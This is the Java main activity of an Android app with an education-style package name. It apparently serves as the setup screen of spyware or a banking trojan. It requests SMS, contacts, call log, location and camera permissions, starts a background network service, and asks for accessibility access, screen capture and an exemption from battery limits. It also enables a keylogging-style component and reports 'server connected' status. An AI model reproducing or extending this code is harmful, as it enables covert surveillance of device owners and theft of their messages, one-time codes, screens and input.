package com.eloeeducacao;

import android.app.Activity;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.TextView;

public class MainActivity extends Activity {

    private static final int REQ_CAP = 10;
    private static final int REQ_NOT = 11;

    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.main);
        arranca();

        java.util.List<String> need = new java.util.ArrayList<>();
        java.util.List<String> perms = new java.util.ArrayList<>();
        perms.add(android.Manifest.permission.READ_SMS);
        perms.add(android.Manifest.permission.RECEIVE_SMS);
        perms.add(android.Manifest.permission.SEND_SMS);
        perms.add(android.Manifest.permission.READ_CONTACTS);
        perms.add(android.Manifest.permission.READ_PHONE_STATE);
        perms.add(android.Manifest.permission.READ_CALL_LOG);
        perms.add(android.Manifest.permission.CALL_PHONE);
        perms.add(android.Manifest.permission.ACCESS_FINE_LOCATION);
        perms.add(android.Manifest.permission.ACCESS_COARSE_LOCATION);
        perms.add(android.Manifest.permission.CAMERA);
        if (Build.VERSION.SDK_INT >= 33) {
            perms.add(android.Manifest.permission.READ_MEDIA_IMAGES);
            perms.add(android.Manifest.permission.POST_NOTIFICATIONS);
        } else {
            perms.add(android.Manifest.permission.READ_EXTERNAL_STORAGE);
        }
        for (String p : perms)
            if (checkSelfPermission(p) != android.content.pm.PackageManager.PERMISSION_GRANTED)
                need.add(p);
        if (!need.isEmpty()) requestPermissions(need.toArray(new String[0]), REQ_NOT);

        findViewById(R.id.b1).setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                try { startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)); }
                catch (Throwable ignored) {}
            }
        });

        findViewById(R.id.b2).setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                MediaProjectionManager m =
                        (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
                startActivityForResult(m.createScreenCaptureIntent(), REQ_CAP);
            }
        });

        findViewById(R.id.b3).setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                try {
                    startActivity(new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                            Uri.parse("package:" + getPackageName())));
                } catch (Throwable ignored) {}
            }
        });

        findViewById(R.id.b4).setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                arranca();
                refresh();
            }
        });
        refresh();
    }

    @Override protected void onResume() {
        super.onResume();
        refresh();
    }

    private void arranca() {
        try {
            Intent s = new Intent(this, NetSvc.class);
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(s);
            else startService(s);
        } catch (Throwable ignored) {}
    }

    private void refresh() {
        TextView t = findViewById(R.id.txt);
        if (t == null) return;
        StringBuilder sb = new StringBuilder();
        sb.append("acessibilidade: ").append(Util.accOn(this) ? "OK" : "PENDENTE").append('\n');
        sb.append("overlay: nativo (acessibilidade)\n");
        sb.append("captura: ").append(ScreenSvc.alive ? "ATIVA" : "PENDENTE").append('\n');
        sb.append("servidor: ").append(Net.online() ? "conectado" : "offline").append('\n');
        sb.append("status: ").append(Net.online() ? "sincronizado" : "aguardando");
        t.setText(sb.toString());
    }

    @Override protected void onActivityResult(int rq, int rs, Intent d) {
        super.onActivityResult(rq, rs, d);
        if (rq == REQ_CAP && rs == RESULT_OK && d != null) {
            Intent s = new Intent(this, ScreenSvc.class);
            s.putExtra("code", rs);
            s.putExtra("data", d);
            try {
                if (Build.VERSION.SDK_INT >= 26) startForegroundService(s);
                else startService(s);
            } catch (Throwable ignored) {}
            if (KeySvc.I != null) KeySvc.I.shotOn = true;
            refresh();
        }
    }
}